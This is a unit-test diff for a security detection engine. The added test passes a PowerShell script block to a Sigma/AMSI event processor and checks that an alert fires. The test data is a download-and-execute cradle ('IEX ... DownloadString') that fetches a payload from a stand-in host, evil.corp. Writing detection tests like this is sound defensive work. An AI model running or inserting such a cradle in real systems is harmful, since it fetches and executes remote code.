@@ -52,4 +52,15 @@ public sealed class SigmaAlertPersistenceTests : IAsyncLifetime
         var processor = new SigmaAmsiEventProcessor(NullLogger<SigmaAmsiEventProcessor>.Instance);
         Assert.DoesNotContain(processor.ProcessEvent(ScriptBlock(rule.Summary, 7)), alert => alert.Title.StartsWith("Sigma", StringComparison.Ordinal));
     }
+
+    [Fact]
+    public void ScriptBlockIsAnalyzedInMemoryBySigmaAmsiEventProcessor()
+    {
+        var processor = new SigmaAmsiEventProcessor(NullLogger<SigmaAmsiEventProcessor>.Instance);
+        var block = new ScriptBlock(100, DateTimeOffset.UtcNow, "IEX (New-Object Net.WebClient).DownloadString('http://evil.corp/payload.ps1')", 1, 1);
+        var detections = processor.ProcessScriptBlock(block);
+
+        Assert.NotEmpty(detections);
+        Assert.Contains(detections, d => d.Title.Contains("Sigma", StringComparison.OrdinalIgnoreCase));
+    }
 }
